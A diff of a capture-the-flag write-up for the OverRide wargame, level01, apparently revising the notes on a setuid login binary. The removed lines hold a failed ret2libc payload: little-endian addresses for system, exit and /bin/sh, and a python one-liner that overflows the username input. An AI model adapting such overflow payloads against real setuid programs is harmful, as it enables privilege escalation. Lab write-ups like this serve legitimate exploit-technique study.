@@ -137,23 +137,15 @@ Edit permissions including suid, then move the binary to home directory.
 level02@OverRide:/tmp$ chmod u+s level01_source; chmod +wx ~; mv level01_source ~
 ```
 
-Exit back to user ```level01```, then launch the source with the ret2libc exploit (with new addresses for system, /bin/sh, and exit).
-
-system 0x 7f ff f7 a6 12 10
-
-       \x10\x12\xa6\xf7\xff\x7f
-       
-exit 0x 7f ff f7 a5 75 80
-
-       \x80\x75\xa5\xf7\xff\x7f
-       
-/bin/sh 0x 7f ff f7 b9 4d 0f
-
-       \x0f\x4d\xb9\xf7\xff\x7f
-       
-I have tried compiling with -fno-stack-protector, -z execstack, and disabling ASLR... no success :(
+Launch the program!
 ```
-level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*80 + "\x10\x12\xa6\xf7\xff\x7f" + "\x80\x75\xa5\xf7\xff\x7f" + "\x0f\x4d\xb9\xf7\xff\x7f"' ; cat -) | ./level01_source
-...
+level01@OverRide:~$ ./level01_source
+********* ADMIN LOGIN PROMPT *********
+Enter Username:
+dat_wil
+verifying username....
 
+Enter Password:
+admin
+nope, incorrect password...
 ```
